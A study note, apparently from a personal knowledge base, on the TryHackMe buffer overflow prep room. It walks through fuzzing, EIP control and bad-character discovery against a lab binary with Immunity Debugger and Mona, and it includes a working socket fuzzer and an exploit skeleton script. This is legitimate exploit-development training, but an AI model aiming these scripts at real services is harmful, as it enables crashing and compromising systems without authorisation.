---
title: Buffer Overflow 🌄
---
I will use the following **tools**:
- [Immunity Debugger](https://www.immunityinc.com/products/debugger/)
- Mona

- *The content of this note was extracted from [TryHackMe](https://tryhackme.com/r/room/bufferoverflowprep)*
## Opening a file with Immunity Debugger

﻿Right-click the Immunity Debugger icon and choose `Run as administrator`.

When **Immunity** loads, click the open file icon, or choose `File` > `Open`. Select the binary you want to open.

The binary will open in a "paused" state, so click the red play icon or choose `Debug` > `Run`. 

## Setting up Mona

Put the following command inside Immunity Debugger:

```shell
!mona config -set workingfolder c:\mona\%p
```

![](Pasted%20image%2020240531184716.png)

## Fuzzing

Save this script:

```python
#!/usr/bin/env python3

import socket, time, sys

ip = "10.10.206.165"#change this

port = 1337#change this
timeout = 5
prefix = "OVERFLOW1 "

string = prefix + "A" * 100

while True:
  try:
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
      s.settimeout(timeout)
      s.connect((ip, port))
      s.recv(1024)
      print("Fuzzing with {} bytes".format(len(string) - len(prefix)))
      s.send(bytes(string, "latin-1"))
      s.recv(1024)
  except:
    print("Fuzzing crashed at {} bytes".format(len(string) - len(prefix)))
    sys.exit(0)
  string += 100 * "A"
  time.sleep(1)
```

Run the fuzzer.py script using python: `python3 fuzzer.py`

The fuzzer will send increasingly long strings comprised of As. If the fuzzer crashes the server with one of the strings, the fuzzer should exit with an error message. Make a note of the largest number of bytes that were sent.

![](Pasted%20image%2020240531185043.png)

## Crash Replication & Controlling EIP

Save this script:

```python
import socket

ip = "10.10.206.165"#change this
port = 1337#change this

prefix = "OVERFLOW1 "#change this
offset = 0
overflow = "A" * offset
retn = ""
padding = ""
payload = ""
postfix = ""

buffer = prefix + overflow + retn + padding + payload + postfix

s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

try:
  s.connect((ip, port))
  print("Sending evil buffer...")
  s.send(bytes(buffer + "\r\n", "latin-1"))
  print("Done!")
except:
  print("Could not connect.")
```

Run the following command to generate a cyclic pattern of a length 400 bytes longer that the string that crashed the server (change the `-l` value to this):

`/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 600`  

If you are using the AttackBox, use the following path to `pattern_create.rb` instead (also ensure to change the `-l` value):

`/opt/metasploit-framework/embedded/framework/tools/exploit/pattern_create.rb -l 600`

Copy the output and place it into the payload variable of the exploit.py script.

On Windows, in Immunity Debugger, re-open the oscp.exe again using the same method as before, and click the red play icon to get it running. You will have to do this prior to each time we run the exploit.py (which we will run multiple times with incremental modifications).

On Kali, run the modified exploit.py script: `python3 exploit.py`

The script should crash the oscp.exe server again. This time, in Immunity Debugger, in the command input box at the bottom of the screen, run the following mona command, changing the distance to the same length as the pattern you created:

`!mona findmsp -distance 600`

Mona should display a log window with the output of the command. If not, click the "Window" menu and then "Log data" to view it (choose "CPU" to switch back to the standard view).

In this output you should see a line which states:

`EIP contains normal pattern : ... (offset XXXX)`

![](Pasted%20image%2020240531185603.png)

Update your exploit.py script and set the offset variable to this value (was previously set to 0). Set the payload variable to an empty string again. Set the retn variable to "BBBB".

Restart oscp.exe in Immunity and run the modified exploit.py script again. The EIP register should now be overwritten with the 4 B's (e.g. 42424242).

![](Pasted%20image%2020240531185815.png)

## Finding Bad Characters

﻿Generate a bytearray using mona, and exclude the null byte (`\x00`) by default. Note the location of the bytearray.bin file that is generated (if the working folder was set per the Mona Configuration section of this guide, then the location should be `C:\mona\oscp\bytearray.bin`).

```shell
!mona bytearray -b "\x00"
```

Now generate a string of bad chars that is identical to the bytearray. The following python script can be used to generate a string of bad chars from \x01 to \xff:

```python
for x in range(1, 256):
  print("\\x" + "{:02x}".format(x), end='')
print()
```

Update your **exploit.py** script and set the payload variable to the string of bad chars the script generates.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Make a note of the address to which the ESP register points and use it in the following mona command:

![](Pasted%20image%2020240531190311.png)

```shell
!mona compare -f C:\mona\oscp\bytearray.bin -a <address>
```

A popup window should appear labelled "mona Memory comparison results". If not, use the Window menu to switch to it. The window shows the results of the comparison, indicating any characters that are different in memory to what they are in the generated bytearray.bin file.

![](Pasted%20image%2020240531190427.png)

Not all of these might be badchars! Sometimes badchars cause the next byte to get corrupted as well, or even effect the rest of the string.

The first badchar in the list should be the null byte (`\x00`) since we already removed it from the file. Make a note of any others. Generate a new bytearray in mona, specifying these new badchars along with `\x00`. Then update the payload variable in your exploit.py script and remove the new badchars as well.

Restart oscp.exe in Immunity and run the modified exploit.py script again. Repeat the badchar comparison until the results status returns "Unmodified". This indicates that no more badchars exist.

